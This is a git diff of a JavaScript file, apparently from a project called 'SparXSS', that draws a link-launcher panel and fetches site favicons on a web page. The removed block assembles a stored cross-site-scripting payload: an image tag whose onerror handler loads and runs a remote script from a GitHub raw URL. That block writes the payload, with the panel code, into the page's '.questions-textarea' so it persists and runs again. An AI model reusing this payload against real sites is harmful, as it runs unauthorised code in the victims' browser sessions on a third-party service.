@@ -773,23 +773,23 @@ if (typeof executed === 'undefined') {
                 return response.text();
             })
             .then(function(data) {
-                //var match = data.match(/<link.*?rel=["']icon["'].*?href=["'](.*?)["']/i);
-                //if (match) {
-                //    faviconURL = match[1];
-                //    console.log("Website URL: " + websiteURL)
-                //    console.log("Favicon Path: " + faviconURL)
-                //    if (faviconURL.startsWith('/') && !websiteURL.endsWith('/')) {
-                //        faviconURL = websiteURL + faviconURL;
-                //    } else if (faviconURL.startsWith('http')) {
-                //        faviconURL = faviconURL;
-                //    } else {
-                //        faviconURL = websiteURL + '/' + faviconURL;
-                //    }
-                //} else {
-                //    faviconURL = 'https://www.google.com/s2/favicons?domain=' + userURL;
-                //}
+                var match = data.match(/<link.*?rel=["']icon["'].*?href=["'](.*?)["']/i);
+                if (match) {
+                    faviconURL = match[1];
+                    console.log("Website URL: " + websiteURL)
+                    console.log("Favicon Path: " + faviconURL)
+                    if (faviconURL.startsWith('/') && !websiteURL.endsWith('/')) {
+                        faviconURL = websiteURL + faviconURL;
+                    } else if (faviconURL.startsWith('http')) {
+                        faviconURL = faviconURL;
+                    } else {
+                        faviconURL = websiteURL + '/' + faviconURL;
+                    }
+                } else {
+                    faviconURL = 'https://www.google.com/s2/favicons?domain=' + userURL;
+                }
 
-                //console.log("Final Favicon URL: " + faviconURL)
+                console.log("Final Favicon URL: " + faviconURL)
     
                 var link = document.createElement('button');
                 link.style.width = '25%';
@@ -828,7 +828,7 @@ if (typeof executed === 'undefined') {
                 imgDiv.style.width = '150px';
                 imgDiv.style.height = '150px';
                 imgDiv.style.textAlign = 'center';
-                // imgDiv.src = faviconURL;
+                imgDiv.src = faviconURL;
                 
                 link.appendChild(imgDiv);
     
@@ -872,71 +872,6 @@ if (typeof executed === 'undefined') {
 
                 link.appendChild(deleteLink)
 
-                var codeSnippet = `var link = document.createElement('button');
-link.style.width = '25%';
-link.style.height = '225px';
-link.style.backgroundColor = '#333';
-link.style.border = 'none';
-link.style.borderRadius = '10px';
-link.style.padding = '15px';
-link.style.boxShadow = '0 0 5px rgba(0, 0, 0, 0.5)';
-link.style.fontSize = '20px';
-link.style.color = '#aaa';
-link.style.cursor = 'pointer';
-link.style.transition = 'background-color 0.3s ease';
-link.style.margin = '10px';
-link.style.textAlign = 'center';
-
-link.addEventListener('mouseover', function () {
-    link.style.backgroundColor = '#444';
-});
-
-link.addEventListener('mouseout', function () {
-    link.style.backgroundColor = '#333';
-});
-
-link.addEventListener('click', function () {
-    if (redirectSwitcher === false) {
-        window.open('https://${userURL}', '_blank');
-    } else {
-        window.location.href = 'https://${userURL}';
-    }
-});
-
-linkContainer.appendChild(link);
-
-var imgDiv = document.createElement('img');
-imgDiv.style.width = '150px';
-imgDiv.style.height = '150px';
-imgDiv.style.textAlign = 'center';
-imgDiv.src = '${faviconURL}';
-
-link.appendChild(imgDiv);
-
-var linkText = document.createElement('div');
-linkText.innerText = '${userURL}';
-linkText.style.marginTop = '10px';
-linkText.style.textAlign = 'center';
-
-link.appendChild(linkText);`;
-
-                var codeBeginning = `<img src=# onerror="var scriptElement=document.createElement('script');scriptElement.src='https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js';scriptElement.onload=function(){if(typeof saved === 'undefined'){saved=true;`;
-                
-                var codeEnd = `}};document.body.appendChild(scriptElement);">`;
-        
-                var textarea = document.querySelector('.questions-textarea');
-                
-                if (typeof linkSave === 'undefined') {
-                    if (textarea !== 'undefined') {
-                        linkSave = true;
-                        textarea.value = codeBeginning + codeSnippet + codeEnd;
-                    }
-                } else if (linkSave === true) {
-                    if (textarea !== 'undefined') {
-                        textarea.value = textarea.value.replace(codeEnd, '');
-                        textarea.value = textarea.value + codeSnippet + codeEnd;
-                    }
-                }
             })
     }
 
